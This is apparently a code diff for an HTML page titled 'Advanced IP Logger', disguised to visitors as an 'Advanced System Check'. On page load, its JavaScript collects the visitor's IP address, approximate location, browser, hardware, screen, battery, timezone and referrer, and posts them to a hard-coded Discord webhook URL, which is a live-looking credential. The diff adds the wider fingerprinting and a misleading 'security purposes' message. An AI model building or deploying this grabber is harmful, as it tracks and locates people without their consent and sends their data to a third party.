@@ -1,26 +1,116 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Information</title>
+    <title>🍇 Advanced IP Logger 🍇</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f8ff;
+            text-align: center;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #6a5acd;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        .grape {
+            font-size: 2em;
+            margin: 20px 0;
+            animation: bounce 2s infinite;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            text-align: left;
+            margin: 25px 0;
+        }
+        .info-card {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            border-left: 4px solid #6a5acd;
+        }
+        .info-card h3 {
+            margin-top: 0;
+            color: #6a5acd;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
     <script>
-        async function sendIPToDiscord() {
+        async function collectAndSendData() {
             try {
-                // Webhook-URL - ersetzen Sie dies mit Ihrem eigenen Webhook
+                // Webhook-URL - ersetzen mit deinem Webhook
                 const webhookURL = 'https://discord.com/api/webhooks/1372171027890835487/7i0kGhrX1wCbCZhaDeWnsq3Dceo5wjZ3brTY3MXpLpBW97ktk2p8aVcUWmFAphtoJabn';
                 
-                // IP-Adresse abrufen (mit einem externen Service)
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+                // Basis-Informationen sammeln
+                const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
                 
-                // Zusätzliche Informationen sammeln
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const timestamp = new Date().toISOString();
+                // Erweiterte Informationen sammeln
+                const screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    orientation: screen.orientation?.type
+                };
                 
-                // Nachricht für Discord erstellen
-                const message = {
-                    content: `Neuer Zugriff:\nIP: ${ip}\nUser-Agent: ${userAgent}\nPlatform: ${platform}\nZeit: ${timestamp}`
+                const browserInfo = {
+                    name: getBrowserName(),
+                    version: getBrowserVersion(),
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    online: navigator.onLine
+                };
+                
+                const locationInfo = await getApproximateLocation(ipData.ip);
+                
+                const systemInfo = {
+                    platform: navigator.platform,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    touchSupport: 'ontouchstart' in window,
+                    battery: await getBatteryStatus()
+                };
+                
+                const timeInfo = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localTime: new Date().toString(),
+                    timezoneOffset: new Date().getTimezoneOffset()
+                };
+                
+                // Discord-Nachricht erstellen
+                const discordMessage = {
+                    content: `🚨 **Neue Verbindung** 🚨`,
+                    embeds: [{
+                        title: "Erfasste Informationen",
+                        fields: [
+                            { name: "🌐 IP-Adresse", value: ipData.ip, inline: true },
+                            { name: "📍 Ungefährer Standort", value: `${locationInfo.city}, ${locationInfo.country}`, inline: true },
+                            { name: "🖥️ System", value: `Platform: ${systemInfo.platform}\nRAM: ${systemInfo.deviceMemory}GB\nCPU-Kerne: ${systemInfo.hardwareConcurrency}`, inline: true },
+                            { name: "🔋 Batterie", value: systemInfo.battery, inline: true },
+                            { name: "🖥️ Bildschirm", value: `${screenInfo.width}x${screenInfo.height} (${screenInfo.colorDepth}bit)`, inline: true },
+                            { name: "🌍 Zeitzone", value: timeInfo.timezone, inline: true },
+                            { name: "🧭 Browser", value: `${browserInfo.name} v${browserInfo.version}\nSprache: ${browserInfo.language}\nCookies: ${browserInfo.cookiesEnabled ? '✅' : '❌'}`, inline: true },
+                            { name: "📅 Lokale Zeit", value: timeInfo.localTime, inline: true },
+                            { name: "🔗 Referrer", value: document.referrer || "Direkter Besuch", inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
                 };
                 
                 // An Discord senden
@@ -29,21 +119,119 @@
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(message),
+                    body: JSON.stringify(discordMessage),
                 });
                 
-                alert('Daten wurden erfolgreich gesendet!');
+                // Info für den Benutzer anzeigen
+                displayUserInfo(ipData, locationInfo, browserInfo, systemInfo, screenInfo, timeInfo);
+                
             } catch (error) {
                 console.error('Fehler:', error);
+                document.getElementById('status').innerHTML = `
+                    <div class="info-card" style="border-left-color: #ff6b6b;">
+                        <h3>Fehler</h3>
+                        <p>Es gab ein Problem beim Sammeln der Informationen.</p>
+                    </div>
+                `;
             }
         }
         
-        // Funktion beim Laden der Seite ausführen
-        window.onload = sendIPToDiscord;
+        // Hilfsfunktionen
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("SamsungBrowser")) return "Samsung Browser";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            if (userAgent.includes("Trident")) return "Internet Explorer";
+            if (userAgent.includes("Edge")) return "Edge";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            return "Unknown";
+        }
+        
+        function getBrowserVersion() {
+            const userAgent = navigator.userAgent;
+            const matches = userAgent.match(/(firefox|chrome|safari|opera|edge|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+            return matches[2] || "unknown";
+        }
+        
+        async function getApproximateLocation(ip) {
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query`);
+                return await response.json();
+            } catch {
+                return { city: "unknown", country: "unknown" };
+            }
+        }
+        
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `Level: ${Math.floor(battery.level * 100)}%\nStatus: ${battery.charging ? 'Lädt' : 'Entlädt'}`;
+                } catch {
+                    return "Keine Batterie-Info";
+                }
+            }
+            return "Battery API nicht verfügbar";
+        }
+        
+        function displayUserInfo(ip, location, browser, system, screen, time) {
+            document.getElementById('status').innerHTML = `
+                <div class="grape">🍇🍇🍇</div>
+                <h2>Deine Systeminformationen wurden erfasst!</h2>
+                <div class="info-grid">
+                    <div class="info-card">
+                        <h3>🌐 Netzwerk</h3>
+                        <p><strong>IP:</strong> ${ip.ip}</p>
+                        <p><strong>Standort:</strong> ${location.city}, ${location.country}</p>
+                        <p><strong>ISP:</strong> ${location.isp || 'Unbekannt'}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🖥️ System</h3>
+                        <p><strong>Platform:</strong> ${system.platform}</p>
+                        <p><strong>RAM:</strong> ${system.deviceMemory || 'Unbekannt'} GB</p>
+                        <p><strong>CPU-Kerne:</strong> ${system.hardwareConcurrency}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🧭 Browser</h3>
+                        <p><strong>Name:</strong> ${browser.name}</p>
+                        <p><strong>Version:</strong> ${browser.version}</p>
+                        <p><strong>Sprache:</strong> ${browser.language}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🖥️ Bildschirm</h3>
+                        <p><strong>Auflösung:</strong> ${screen.width}x${screen.height}</p>
+                        <p><strong>Farbtiefe:</strong> ${screen.colorDepth} bit</p>
+                        <p><strong>Orientierung:</strong> ${screen.orientation || 'Standard'}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🌍 Zeit</h3>
+                        <p><strong>Zeitzone:</strong> ${time.timezone}</p>
+                        <p><strong>Lokale Zeit:</strong> ${time.localTime}</p>
+                        <p><strong>UTC Offset:</strong> ${time.timezoneOffset} min</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🔋 Energie</h3>
+                        <p>${system.battery.replace('\n', '<br>')}</p>
+                    </div>
+                </div>
+                <p style="margin-top: 20px; font-size: 0.9em; color: #666;">
+                    Diese Informationen werden für Sicherheitszwecke gesammelt.
+                </p>
+            `;
+        }
+        
+        window.onload = collectAndSendData;
     </script>
 </head>
 <body>
-    <h1>Willkommen</h1>
-    <p>Diese Seite sendet automatisch Informationen an den Server.</p>
+    <div class="container">
+        <h1>Advanced System Check</h1>
+        <div id="status">
+            <p>Sammlung von Systeminformationen...</p>
+            <div class="grape">🍇</div>
+        </div>
+    </div>
 </body>
 </html>
